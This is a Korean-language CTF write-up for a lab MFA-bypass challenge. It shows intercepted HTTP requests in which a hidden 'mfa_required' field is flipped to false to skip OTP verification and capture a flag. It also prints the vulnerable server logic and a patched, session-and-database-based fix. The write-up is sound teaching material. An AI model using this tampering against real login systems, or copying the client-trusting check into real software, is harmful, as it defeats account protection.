+++
title = "VulnABLE CTF [LUXORA] Write-up: MFA Bypass 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "MFA Bypass", "Bronze", "Parameter Manipulation", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: MFA Bypass 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (MFA Bypass)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/mfa/bronze`
- **목표**: 아이디와 비밀번호 인증 후 진행되는 다중 요소 인증(MFA, Multi-Factor Authentication) 과정에서, 파라미터 조작(Parameter Manipulation)을 통해 OTP 검증을 건너뛰고 로그인에 성공하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 인증 플로우 분석 (Reconnaissance)

`/mfa/bronze` 경로에 주어지는 힌트 계정(`user` / `password123`)으로 로그인을 시도합니다.

**[1단계: 로그인 요청]**
```http
POST /mfa/bronze/login HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

username=user&password=password123
```

**[1단계: 서버의 응답]**
```http
HTTP/1.1 302 Found
Location: /mfa/bronze/verify?step=2
```
로그인 정보가 맞으면 `/verify` 페이지로 리다이렉트 시킵니다.

**[2단계: MFA 검증 페이지 접근]**
해당 페이지에서는 6자리 OTP 코드를 입력하는 폼이 나타납니다.
```html
<form action="/mfa/bronze/verify" method="POST">
  <input type="hidden" name="user" value="user">
  <input type="hidden" name="mfa_required" value="true">
  <input type="text" name="otp" placeholder="Enter 6-digit OTP">
  <button type="submit">Verify</button>
</form>
```

**[해커의 사고 과정]**
1. 폼(Form)을 자세히 보니 숨겨진 필드(Hidden Field)로 `mfa_required=true` 라는 값이 전송되고 있다.
2. 서버는 이 `mfa_required` 파라미터를 보고 "아, 이 유저는 MFA 검증을 해야 하는구나" 하고 판단할 가능성이 높다.
3. 클라이언트가 보내는 파라미터는 언제든지 해커가 조작할 수 있다! 이 값을 `false` 로 바꾸면 서버가 어떻게 반응할까?

---

## 💥 2. 취약점 식별 및 파라미터 조작 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(mfa_required=false)--> [ Web Server ]
                                       |-- Trusts Client Parameter
                                       |-- Bypasses MFA
```


이 취약점은 클라이언트 측에서 제공하는 데이터를 서버가 아무 의심 없이 신뢰할 때 발생하는 전형적인 **Parameter Manipulation** 입니다.

Burp Suite의 Proxy 기능(Intercept)을 켜고, 폼에서 아무 숫자나 입력한 뒤 [Verify] 버튼을 누릅니다.

### 💡 패킷 가로채기 및 조작 (Tampering)

**[원본 패킷]**
```http
POST /mfa/bronze/verify HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

user=user&mfa_required=true&otp=123456
```

**[조작된 패킷]**
`mfa_required=true` 를 `false` 로 변경합니다.

```http
POST /mfa/bronze/verify HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

user=user&mfa_required=false&otp=123456
```

---

## 🚀 3. 조작된 패킷 전송 및 결과 확인

수정한 패킷을 서버로 전송(Forward)합니다.

### 🔍 서버의 응답
서버는 `mfa_required=false` 라는 해커의 주장을 철썩같이 믿고, OTP(`123456`)가 틀렸음에도 불구하고 검증 과정을 통과시켜 버립니다!

```html
HTTP/1.1 200 OK
Content-Type: text/html

<div class="dashboard">
  <h2>Welcome to your secure account, user.</h2>
  <p>MFA Status: Skipped/Disabled</p>
  <p class="flag">FLAG{MFA_🥉_PARAM_TAMPER_E4F5G6}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

강력한 2차 인증(MFA) 시스템을 구축해 놓고도, 그 적용 여부를 결정하는 스위치를 클라이언트(브라우저)에게 맡겨버리는 논리적 결함을 이용하여 인증을 완전히 무력화시켰습니다.

**🔥 획득한 플래그:**
`FLAG{MFA_🥉_PARAM_TAMPER_E4F5G6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자의 인증 상태나 보안 정책(MFA 적용 여부)을 `input type="hidden"` 과 같은 클라이언트 측 데이터에 의존한 것이 치명적인 실수입니다.

* **취약한 서버 로직**
```javascript
// 클라이언트가 보낸 req.body.mfa_required 를 무조건 신뢰함
if (req.body.mfa_required === 'false') {
    return loginUser(req.body.user); // OTP 검사 스킵
}
verifyOTP(req.body.otp);
```

* **안전한 패치 가이드 (서버 중심 상태 관리)**
클라이언트가 보내는 데이터(`mfa_required`, `role`, `user`)는 무조건 조작 가능하다고 가정(Zero Trust)해야 합니다. 이 유저가 MFA를 켰는지 안 켰는지는 반드시 백엔드의 데이터베이스(DB)에서 직접 조회하여 판단해야 합니다.
```javascript
// 서버 DB에서 해당 유저의 보안 설정 조회
const userRecord = await db.query("SELECT mfa_enabled FROM users WHERE username = $1", [req.session.username]);

if (userRecord.mfa_enabled === true) {
    // DB 기준 MFA가 켜져 있으면, 클라이언트가 무슨 값을 보내든 무조건 OTP 검증 실행
    verifyOTP(req.body.otp);
} else {
    loginUser(req.session.username);
}
```
또한, 현재 누구의 OTP를 검증하는지에 대한 정보(`user=user`) 역시 파라미터가 아닌, 1단계 로그인 시 발급된 **서버 측 세션(Session)** 정보를 사용해야 다른 사람의 계정으로 우회하는 취약점(IDOR 결합)을 막을 수 있습니다.